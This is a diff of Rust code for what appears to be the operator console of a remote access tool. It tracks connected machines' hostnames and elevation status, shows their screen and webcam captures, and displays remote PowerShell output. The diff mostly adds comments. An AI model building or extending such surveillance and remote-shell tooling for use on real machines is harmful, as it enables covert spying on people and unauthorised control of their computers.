@@ -8,87 +8,84 @@ use shared::commands::CaptureType;
 
 // updates coming in to/from the Server
 pub fn server(view: &mut View, _ctx: &Context) {
-    while let Ok(msg) = view.mouthpiece.from_server.try_recv() {
+    // in the case that we'd need to manipulate the UI from this code,
+    // ctx is given as an argument. but we don't need it, so it's prefixed again.
+    while let Ok(msg) = view.mouthpiece.from_server.try_recv() { // when we get a message from the server mouthpiece
         match msg {
-            ServerMessage::Listening => {
-                view.state.listening = true;
+            ServerMessage::Listening => { // if it tells us we're now listening
+                view.state.listening = true; // update the ui state variable appropriately
             }
-            ServerMessage::Stopped => {
+            ServerMessage::Stopped => { // do the same if we're done listening
                 view.state.listening = false;
-            } /*ServerMessage::NewConnection(client) => {
-                  println!(
-                      "[*][updates()] whitelisted mutex {} has connected!",
-                      client.mutex
-                  );
-              }
-              ServerMessage::Receive(_mutex, _data) => {
-                  println!("[*][updates()] implement receive");
-              }*/
+            }
         }
     }
 }
 
-// updates coming in to/from the Manager
+// updates coming in from the Manager
 pub fn manager(view: &mut View, _ctx: &Context) {
+    // wait until we receive a message from the manager
     while let Ok(msg) = view.mouthpiece.from_manager.try_recv() {
         match msg {
             UiManagerResponse::GetResponse(mutex, response) => {
-                // println!("[*][updates] sup");
-
                 match response {
                     ProcessedResponse::Success => {
-                        println!("[v] yay shit just works");
+                        // there is nothing to do here
                     }
                     ProcessedResponse::ComputerInfo(info, socket) => {
+                        // if our client hashmap already has this mutex as a key
                         if view.state.clients.contains_key(&mutex) {
-                            // we already have info on this client
-                            println!("[*] already got you");
+                            // we already have info on this client. we don't need to add it again
+                            println!("[*] already have this client");
                         } else {
                             println!("[*] new client to show on screen");
-                            view.state.clients.insert(
-                                mutex.clone(),
-                                ClientView::new(
-                                    socket.to_string(),
+                            view.state.clients.insert( // add to the hashmap
+                                mutex.clone(), // clone the mutex to keep
+                                ClientView::new( // create a new ClientView struct for this client
+                                    // we use this struct to store info shown on the UI
+                                    socket.to_string(), // IP address and port client is connecting from
                                     mutex,
-                                    info.elevated, // grab this because it can change
-                                    info,
-                                    view.mouthpiece.to_manager.clone(),
+                                    info, // ComputerInfoResponse struct containing:
+                                    // hostname, elevation status, monitors and cameras connected
+                                    view.mouthpiece.to_manager.clone(), // channel to send messages back to the manager if we need to
                                 ),
                             );
-                            // println!("{}", view.state.clients.len());
                         }
                     }
+                    //                               enum of Camera, Screen, or (unused) Mic
                     ProcessedResponse::CapturePacket(capture_type, image) => {
-                        // println!("[*] got img");
+                        // ensure this client actually exists before trying anything
                         if let Some(client) = view.state.clients.get_mut(&mutex) {
                             match capture_type {
-                                CaptureType::Screen => {
-                                    client.state.captures.screen.data = Some(image);
-                                    client.state.textures.screen = None;
+                                CaptureType::Screen => { // if we get Screen data
+                                    client.state.captures.screen.data = Some(image); // update Screen view state
+                                    client.state.textures.screen = None; // reset texture so it gets repainted
                                 }
                                 CaptureType::Camera => {
-                                    client.state.captures.webcam.data = Some(image);
-                                    client.state.textures.webcam = None;
+                                    client.state.captures.webcam.data = Some(image); // update Webcam view state
+                                    client.state.textures.webcam = None; // reset texture so it gets repainted
                                 }
-                                _ => { /* dont care about audio */ }
+                                _ => { /* audio not implemented for many reasons */ }
                             }
                         }
                     }
                     ProcessedResponse::PowerShell(stdout) => {
+                        // ensure client exists
                         if let Some(client) = view.state.clients.get_mut(&mutex) {
+                            // display shell response in output read-only text box
                             client.state.powershell.output = stdout;
                         }
                     }
                     ProcessedResponse::Error(err) => {
-                        println!("[x] oopsie: {}", err);
+                        println!("[x] oops: {}", err);
                     }
                 }
             }
-            UiManagerResponse::Remove(mutex) => {
-                view.state.clients.remove(&mutex);
+            UiManagerResponse::Remove(mutex) => { // if we are told to remove the client
+                view.state.clients.remove(&mutex); // remove it from the view state
             }
-            UiManagerResponse::RemoveAll => {
-                view.state.clients.clear();
+            UiManagerResponse::RemoveAll => { // if we are told to remove ALL clients
+                view.state.clients.clear(); // we wipe the view state hashmap entirely
             }
         }
     }
